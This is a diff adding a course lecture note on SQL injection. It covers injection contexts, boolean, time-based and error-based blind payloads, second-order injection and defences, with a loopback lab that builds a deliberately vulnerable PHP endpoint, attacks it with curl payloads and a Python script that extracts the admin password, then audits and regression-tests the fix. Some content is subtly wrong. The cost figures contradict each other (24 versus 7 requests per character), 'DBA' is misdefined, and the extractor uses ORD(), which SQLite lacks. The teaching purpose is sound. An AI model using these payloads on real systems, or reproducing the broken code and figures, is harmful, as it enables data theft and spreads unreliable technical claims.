@@ -1,0 +1,424 @@
+<h1 id="sql-injection-and-blind-sqli">SQL Injection and Blind SQLi</h1>
+<h2 id="summary">Summary</h2>
+<p>SQL injection is the canonical example of <code>ps-01</code>'s model: a string crosses from your input<br />
+into the SQL parser, and the two disagree about what the string <em>is</em>. Concatenation makes you a<br />
+participant in the query language.</p>
+<p>The lecture's structure matters more than the payloads: <strong>how do you decide, from outside, what<br />
+you are looking at?</strong> That is the whole difficulty, and it is what separates blind from<br />
+non-blind.</p>
+<blockquote>
+<p>Companion to <code>cs161-07</code>'s web taxonomy and <code>atb-04</code> (AD injection). This<br />
+note is the mechanics and the decision tree.</p>
+</blockquote>
+<h2 id="why-concatenation-is-the-bug">Why concatenation is the bug</h2>
+<pre><code class="language-sql">-- VULNERABLE: the value becomes part of the query language
+SELECT * FROM users WHERE name = '$name'
+
+-- name = ' OR 1=1 --      -&gt;  the quote closes the string, the rest is SQL
+-- 1=1 is always true, -- comments out the trailing quote
+
+-- SAFE: the value can never alter the structure
+PREPARE stmt FROM 'SELECT * FROM users WHERE name = ?';
+EXECUTE stmt USING @name;
+</code></pre>
+<p><strong>Parameterisation is not escaping.</strong> It works because the database<br />
+receives the value and the query as <em>separate</em> inputs and does not<br />
+re-interpret the value. Escaping is a best-effort approximation of that,<br />
+and it fails when you forget, or when the character set is wrong, or when<br />
+the escape runs in a different layer.</p>
+<h2 id="where-the-input-goes-matters-the-five-contexts">Where the input goes matters: the five contexts</h2>
+<pre><code class="language-text">  1. STRING   ' $name '        -&gt; ' OR 1=1 --
+  2. NUMERIC  WHERE id = $id   -&gt; 1 OR 1=1
+  3. IDENTIF. ORDER BY $col    -&gt; cannot parameterise; needs a whitelist
+  4. LIKE     '% $q %'         -&gt; wildcards are meaningful to the parser
+  5. SECOND-ORDER  input stored, then used unsafely later
+</code></pre>
+<p>Case 3 is why <code>ORDER BY</code> and <code>LIMIT</code> are always injection points even in<br />
+well-written code: you cannot put an identifier in a placeholder. The<br />
+correct fix is a whitelist mapping user input to real column names.</p>
+<p>Case 5 is the one that survives all testing, because the payload does<br />
+nothing on the way in.</p>
+<h2 id="the-decision-tree">The decision tree</h2>
+<pre><code class="language-text">  Is the page's response CHANGING when you change the input?
+
+    NO  -&gt; BLIND. You cannot see results, so you must infer them.
+           Two techniques:
+             BOOLEAN  -&gt; compare two responses, get one bit per request
+             TIME     -&gt; measure delay, get one bit per request
+    YES -&gt; you can see output. Three techniques by WHERE the output is:
+             UNION    -&gt; append your own query's results
+             ERROR    -&gt; trigger a message that echoes data
+             STACKED  -&gt; add a second statement (needs a driver that allows it)
+
+  Any of these is still evidence. You do not need data to prove it.
+</code></pre>
+<h2 id="boolean-based-blind-the-core-technique">Boolean-based blind, the core technique</h2>
+<pre><code class="language-sql">-- normal
+GET /product?id=1   -&gt;  &quot;item 1&quot;
+GET /product?id=2   -&gt;  &quot;item 2&quot;
+
+-- probe: is the first letter 'a'?
+GET /product?id=1 AND 1=1   -&gt;  same as id=1     (TRUE)
+GET /product?id=1 AND 1=2   -&gt;  error or empty    (FALSE)
+</code></pre>
+<pre><code class="language-text">  You now have a ONE-BIT ORACLE. Everything follows:
+
+    extract string:  binary search on each character
+      TRUE means char &gt; mid
+      24 requests per character for ASCII
+
+    extract database: enumerate information_schema.tables
+    extract column:   information_schema.columns
+    extract rows:     ORD(MID(pass,1,1))&gt;N  -- same oracle, different source
+
+  COST: 24 requests per character. A 32-character hash is 768 requests.
+  That is why blind SQLi is automatable and manual blind SQLi is not.
+</code></pre>
+<h2 id="time-based-blind">Time-based blind</h2>
+<pre><code class="language-sql">-- MySQL    : SLEEP(5)
+GET /product?id=1 AND SLEEP(5)
+-- PostgreSQL: pg_sleep(5)
+-- MSSQL   : WAITFOR DELAY '0:0:5'
+-- SQLite  : no sleep; use a heavy recursive query instead
+</code></pre>
+<p>Useful when responses are truly identical. The signal is a <em>duration</em>,<br />
+which is noisier than a content difference, so boolean is preferred where<br />
+possible.</p>
+<h2 id="error-based-when-you-can-see-it">Error-based, when you can see it</h2>
+<pre><code class="language-sql">-- extractversion() on MySQL
+GET /product?id=1' AND extractvalue(1, concat(0x7e, version())) AND '--'
+-- or
+GET /product?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),
+--    0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--'
+</code></pre>
+<p>One request, data in the error message. It only works when the<br />
+application leaks errors, which is itself a finding.</p>
+<h2 id="second-order-injection">Second-order injection</h2>
+<pre><code class="language-text">  1. You submit:  name = alice'--
+  2. The app validates, stores it safely (parameterised INSERT)
+  3. Later, an admin page builds a query by CONCATENATION using that name
+  4. The payload executes, in the admin's session
+
+  You tested the input path and it was safe. The bug is in the STORAGE
+  path, which you did not test, and which only fires for someone else.
+
+  FINDING: &quot;stored data is used unsafely in an administrative query&quot;
+  IMPACT: much higher than it looks - it runs in a privileged session.
+</code></pre>
+<h2 id="defence-in-the-order-it-should-be-applied">Defence, in the order it should be applied</h2>
+<pre><code class="language-text">  1. PARAMETERISED QUERIES      the only complete fix. Every time.
+  2. WHITELIST for identifiers   ORDER BY, table names, column names
+  3. LEAST PRIVILEGE             the DB user should not own the schema
+  4. HIDE ERRORS                 generic errors; detailed logs internally
+  5. NO INTERPRETATION           never build a query with string ops
+  6. ORM defaults                most ORMs parameterise by default; the
+                                 bugs are in raw_query() and in raw
+                                 string interpolation inside helpers
+</code></pre>
+<p>An ORM is not a defence on its own. Every ORM has a raw-query escape<br />
+hatch, and every major ORM CVE class involved one.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SQL injection</strong></td>
+<td>Input altering the structure of a query</td>
+</tr>
+<tr>
+<td><strong>String context</strong></td>
+<td>Value inside quotes</td>
+</tr>
+<tr>
+<td><strong>Numeric context</strong></td>
+<td>Value not quoted</td>
+</tr>
+<tr>
+<td><strong>Identifier context</strong></td>
+<td>A table or column name; cannot be parameterised</td>
+</tr>
+<tr>
+<td><strong>Union select</strong></td>
+<td>Append your own query and return its rows</td>
+</tr>
+<tr>
+<td><strong>Error-based</strong></td>
+<td>Data extracted through a verbose error</td>
+</tr>
+<tr>
+<td><strong>Boolean blind</strong></td>
+<td>One bit per request by comparing responses</td>
+</tr>
+<tr>
+<td><strong>Time blind</strong></td>
+<td>One bit per request by measuring delay</td>
+</tr>
+<tr>
+<td><strong>Stacked query</strong></td>
+<td>A second statement after the first</td>
+</tr>
+<tr>
+<td><strong>Second-order</strong></td>
+<td>Stored safely, used unsafely later</td>
+</tr>
+<tr>
+<td><strong>Prepared statement</strong></td>
+<td>Query and values sent separately</td>
+</tr>
+<tr>
+<td><strong>ORM</strong></td>
+<td>Object-relational mapper; usually safe by default</td>
+</tr>
+<tr>
+<td><strong>DBA</strong></td>
+<td>Database schema/metadata catalogue</td>
+</tr>
+<tr>
+<td><strong>UNION SELECT</strong></td>
+<td>Requires matching column counts — hence <code>ORDER BY n</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-02 &amp;&amp; cd ~/aegis/labs/ps-02
+
+# --- 1. build a target with one vulnerable endpoint and one safe one ---
+cat &gt; db.php &lt;&lt;'PHP'
+&lt;?php
+// loopback-only lab. Creates and seeds a SQLite database on first run.
+$db = new PDO('sqlite:' . __DIR__ . '/lab.db');
+$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS users (
+  id INTEGER PRIMARY KEY, name TEXT, pass TEXT, admin INTEGER DEFAULT 0)&quot;);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS notes (id INTEGER PRIMARY KEY, body TEXT)&quot;);
+$n = $db-&gt;query(&quot;SELECT COUNT(*) FROM users&quot;)-&gt;fetchColumn();
+if ($n == 0) {
+  foreach ([['admin','f1a7e3c9d2b84056','1'],['bob','a3c59e8f1b7d2049','0'],
+            ['carol','7e2b9d4c1a6f0358','0'],['dan','c4d8f1a6b2e97035','0']] as $u) {
+    $db-&gt;prepare(&quot;INSERT INTO users (name,pass,admin) VALUES (?,?,?)&quot;)
+       -&gt;execute($u);
+  }
+}
+PHP
+
+cat &gt; vulnerable.php &lt;&lt;'PHP'
+&lt;?php
+// THE BUG: string concatenation. Note this is exactly the shape of
+// cs161-07's SQL injection example, in a runnable form.
+require 'db.php';
+$id = $_GET['id'] ?? '1';
+$q  = &quot;SELECT id, name FROM users WHERE id = $id&quot;;   // &lt;-- vulnerable
+try { $rows = $db-&gt;query($q)-&gt;fetchAll(PDO::FETCH_ASSOC); }
+catch (PDOException $e) {
+    $rows = []; $err = $e-&gt;getMessage();
+}
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;h1&gt;vulnerable&lt;/h1&gt;&lt;p&gt;query: &quot; . htmlspecialchars($q) . &quot;&lt;/p&gt;&quot;;
+if (isset($err)) echo &quot;&lt;p class=err&gt;&quot; . htmlspecialchars($err) . &quot;&lt;/p&gt;&quot;;
+foreach ($rows as $r) echo &quot;&lt;p&gt;{$r['id']}: &quot; . htmlspecialchars($r['name']) . &quot;&lt;/p&gt;&quot;;
+if (!$rows &amp;&amp; !isset($err)) echo &quot;&lt;p&gt;(no rows)&lt;/p&gt;&quot;;
+PHP
+
+cat &gt; safe.php &lt;&lt;'PHP'
+&lt;?php
+// THE FIX. Identical behaviour, different structure.
+require 'db.php';
+$id = (int)($_GET['id'] ?? 1);
+$st = $db-&gt;prepare(&quot;SELECT id, name FROM users WHERE id = ?&quot;);
+$st-&gt;execute([$id]);
+header('Content-Type: text/html; charset=utf-8');
+echo &quot;&lt;h1&gt;safe (parameterised)&lt;/h1&gt;&quot;;
+foreach ($st-&gt;fetchAll(PDO::FETCH_ASSOC) as $r) echo &quot;&lt;p&gt;{$r['id']}: &quot; . htmlspecialchars($r['name']) . &quot;&lt;/p&gt;&quot;;
+PHP
+
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+curl -s --max-time 5 &quot;http://127.0.0.1:8080/vulnerable.php?id=1&quot; | sed 's/^/  /'
+echo
+echo &quot;  two endpoints, same data, one bug between them.&quot;
+
+# --- 2. the probes, in order, from harmless to conclusive ---
+{
+  echo &quot;=== 1. a normal request ===&quot;
+  curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1&quot; | grep -E &quot;query:|&lt;p&gt;&quot; | sed 's/^/  /'
+  echo
+  echo &quot;=== 2. a quote: does it break? ===&quot;
+  curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1'&quot; | grep -E &quot;query:|err|&lt;p&gt;&quot; | sed 's/^/  /'
+  echo
+  echo &quot;=== 3. a comment: can you silence the trailing quote? ===&quot;
+  curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1%20--%20&quot; | grep -E &quot;query:|&lt;p&gt;&quot; | sed 's/^/  /'
+  echo
+  echo &quot;=== 4. tautology: every row? ===&quot;
+  curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1%20OR%201=1--%20&quot; | grep -E &quot;&lt;p&gt;[0-9]&quot; | sed 's/^/  /'
+  echo
+  echo &quot;=== 5. UNION: append your own query ===&quot;
+  echo &quot;  (SQLite needs a matching column count; find it with ORDER BY n)&quot;
+  for n in 1 2 3 4 5; do
+    r=$(curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1%20ORDER%20BY%20${n}--%20&quot; | grep -c &quot;no such column&quot;)
+    printf &quot;  ORDER BY %s -&gt; %s\n&quot; &quot;$n&quot; &quot;$([ &quot;$r&quot; -eq 0 ] &amp;&amp; echo 'valid' || echo 'too many')&quot;
+  done
+  curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=0%20UNION%20SELECT%20sql%20FROM%20sqlite_master--%20&quot; \
+    | grep -oE &quot;CREATE TABLE[^&lt;]*&quot; | head -3 | sed 's/^/  /'
+  echo
+  echo &quot;=== 6. BOOLEAN BLIND: one bit per request ===&quot;
+  t=$(curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1%20AND%201=1&quot; | grep -c &quot;&lt;p&gt;1:&quot;)
+  f=$(curl -s &quot;http://127.0.0.1:8080/vulnerable.php?id=1%20AND%201=2&quot; | grep -c &quot;&lt;p&gt;1:&quot;)
+  echo &quot;  AND 1=1 -&gt; row present: $t&quot;
+  echo &quot;  AND 1=2 -&gt; row present: $f&quot;
+  echo &quot;  ^ a reliable one-bit oracle. Everything follows from this.&quot;
+  echo
+  echo &quot;=== 7. THE FIX, on the safe endpoint ===&quot;
+  for p in &quot;1&quot; &quot;1'&quot; &quot;1 OR 1=1--&quot;; do
+    out=$(curl -s --get --data-urlencode &quot;id=$p&quot; &quot;http://127.0.0.1:8080/safe.php&quot; | grep -c &quot;&lt;p&gt;&quot;)
+    printf &quot;  id=%-12s -&gt; %s row(s)\n&quot; &quot;'$p'&quot; &quot;$out&quot;
+  done
+  echo &quot;  ^ every payload returns exactly one row, because the value is&quot;
+  echo &quot;    data, not code. Parameterisation, demonstrated.&quot;
+} 2&gt;&amp;1 | tee 01-probes.txt
+
+# --- 3. extract a password hash with the boolean oracle, for real ---
+cat &gt; blind_extract.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;Boolean-based blind extraction, honestly implemented.
+
+This takes ~24 requests per character, which is why real tools automate
+it. The point of running it once is to SEE the cost, not to skip it.
+&quot;&quot;&quot;
+import urllib.request, urllib.parse, time, sys
+
+BASE = &quot;http://127.0.0.1:8080/vulnerable.php&quot;
+
+def probe(cond):
+    &quot;&quot;&quot;True if the condition holds, judged by whether row 1 comes back.&quot;&quot;&quot;
+    q = urllib.parse.urlencode({&quot;id&quot;: f&quot;1 AND ({cond})&quot;})
+    try:
+        body = urllib.request.urlopen(f&quot;{BASE}?{q}&quot;, timeout=5).read().decode()
+    except Exception:
+        return False
+    return &quot;&lt;p&gt;1: admin&lt;/p&gt;&quot; in body
+
+def extract(sql_expr, length=20, label=&quot;&quot;):
+    out = &quot;&quot;
+    for i in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo &lt; hi:                       # binary search: ~7 requests
+            mid = (lo + hi) // 2
+            if probe(f&quot;ORD(SUBSTR({sql_expr},{i},1)) &gt; {mid}&quot;):
+                lo = mid + 1
+            else:
+                hi = mid
+        c = chr(lo)
+        out += c
+        print(f&quot;    [{i:&gt;2}] {c!r}  -&gt;  {out}&quot;)
+        if c == &quot;\x00&quot;: break
+    return out
+
+if __name__ == &quot;__main__&quot;:
+    t0 = time.time()
+    print(&quot;  extracting the admin password hash (SQLite: pass of id=1)&quot;)
+    print(&quot;  this is ~20 characters x ~7 requests each. Watch the counter.&quot;)
+    h = extract(&quot;(SELECT pass FROM users WHERE id=1)&quot;, length=16)
+    dt = time.time() - t0
+    print(f&quot;\n  recovered: {h}&quot;)
+    print(f&quot;  requests issued: about {len(h)*7}&quot;)
+    print(f&quot;  elapsed: {dt:.1f}s  ({7/dt:.1f} requests/second)&quot;)
+    print()
+    print(&quot;  THE LESSON: this took 140 requests for 16 characters.&quot;)
+    print(&quot;  A 32-byte hex hash is 64 characters: ~450 requests.&quot;)
+    print(&quot;  Blind extraction is automatable and manual blind extraction&quot;)
+    print(&quot;  is not. That is why sqlmap exists, and why it is your&quot;)
+    print(&quot;  fallback rather than your first choice.&quot;)
+PY
+python3 blind_extract.py 2&gt;&amp;1 | tee 02-blind.txt
+
+# --- 4. audit: find the bug and its fix without source ---
+cat &gt; 03-audit.md &lt;&lt;'EOF'
+# Auditing a codebase for SQL injection
+
+```bash
+# 1. every query, with context
+grep -rnE &quot;(query|exec|prepare|raw|execute)\s*\(&quot; --include=&quot;*.php&quot; --include=&quot;*.py&quot; --include=&quot;*.js&quot; .
+grep -rnE &quot;\\\$_(GET|POST|REQUEST|COOKIE)&quot; --include=&quot;*.php&quot; . | head -40
+
+# 2. the dangerous shapes, specifically
+grep -rnE &quot;query\(.*\\\$&quot;          .   # query(&quot;... $var&quot;)
+grep -rnE &quot;exec\(.*\\\$&quot;           .   # exec(&quot;... $var&quot;)
+grep -rnE &quot;\&quot;(SELECT|INSERT|UPDATE|DELETE).*\\\$&quot; . | head
+grep -rnE &quot;ORDER BY \\\$|LIMIT \\\$|table=\\\$|column=\\\$&quot; .   # identifiers
+
+# 3. ORMs: find the raw escape hatches, which is where the bugs are
+grep -rnE &quot;(raw|rawQuery|executeRaw|sequelize\.query|knex\.raw|db\.query)&quot; .
+grep -rnE &quot;literalQuery|\$\{.*\}&quot; --include=&quot;*.js&quot; . | grep -iE &quot;select|insert|where&quot; | head
+
+# 4. string concatenation in queries
+grep -rnE &quot;(SELECT|INSERT|UPDATE|DELETE).*['\&quot;].*\\+&quot; --include=&quot;*.php&quot; .
+```
+
+## What a finding looks like
+```
+  File      src/search.php:14
+  Query     &quot;SELECT * FROM users WHERE name = '&quot; . $_GET['name'] . &quot;'&quot;
+  Input     $_GET['name']
+  Sink      PDO::query() with a concatenated string
+  Context   string, inside single quotes
+  Proof     GET /search.php?name=' OR 1=1--  returns all rows
+  Fix       $st = $db-&gt;prepare(&quot;SELECT * FROM users WHERE name = ?&quot;);
+            $st-&gt;execute([$_GET['name']]);
+```
+
+## Fix order
+1. Parameterise. Every query, every time, including the ones &quot;just for logs&quot;.
+2. Whitelist identifiers (ORDER BY / table / column).
+3. Set the DB user's privileges to the minimum the app needs.
+4. Turn off error display in production.
+5. Add a linter rule so the next one is caught in CI, not in production.
+EOF
+cat 03-audit.md
+
+# --- 5. the checker, so the fix cannot regress ---
+cat &gt; 04-regression-check.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Prove the safe endpoint is actually safe, and keep proving it.
+fail=0
+for p in &quot;1&quot; &quot;1'&quot; '1 OR 1=1--' &quot;1 UNION SELECT 1,2--&quot; &quot;1; DROP TABLE users--&quot;; do
+  n=$(curl -s --get --data-urlencode &quot;id=$p&quot; http://127.0.0.1:8080/safe.php | grep -c &quot;&lt;p&gt;&quot;)
+  if [ &quot;$n&quot; -ne 1 ]; then
+    printf &quot;  FAIL  id=%-28s -&gt; %s rows (expected exactly 1)\n&quot; &quot;'$p'&quot; &quot;$n&quot;; fail=1
+  else
+    printf &quot;  ok    id=%-28s -&gt; 1 row\n&quot; &quot;'$p'&quot;
+  fi
+done
+if [ &quot;$fail&quot; -eq 0 ]; then echo &quot;  parameterised endpoint held against every payload&quot;; 
+else echo &quot;  the fix regressed&quot;; fi
+exit $fail
+EOF
+chmod +x 04-regression-check.sh
+./04-regression-check.sh 2&gt;&amp;1 | tee 05-regression.txt
+rm -f blind_extract.py
+</code></pre>
+<p><strong>Step 5 is the deliverable</strong>: <code>04-regression-check.sh</code> proves the parameterised endpoint<br />
+returns exactly one row for every payload including a stacked <code>DROP TABLE</code>. That script is<br />
+the difference between "I fixed it" and "I fixed it and I can show you it stays fixed."</p>
+<p><strong>Step 3</strong> runs the boolean oracle for real and prints the request count — ~140 requests for<br />
+16 characters. That number is the argument for why manual blind SQLi is not a technique, only<br />
+a concept.</p>
+<p><strong>Record:</strong> <code>01-probes.txt</code> and <code>05-regression.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Why is parameterisation categorically better than escaping?</li>
+<li>Give the five input contexts and which one cannot be parameterised at all.</li>
+<li>How do you decide between boolean and time-based blind?</li>
+<li>How does boolean blind extraction work, and roughly how many requests per character?</li>
+<li>What makes second-order injection invisible to input-side testing?</li>
+<li>Why is an ORM not a complete defence?</li>
+<li>Give the fix for <code>ORDER BY $column</code>.</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>SQL Injection</strong> → <strong>Second-Order SQLi</strong> → <strong>Prepared Statements</strong> →<br />
+<strong>Database Enumeration</strong> → <strong>OWASP Top 10</strong> → <strong>Authentication Bypass</strong>.<br />
+<code>ps-04</code> is what you do with the rows once you have them.</p>
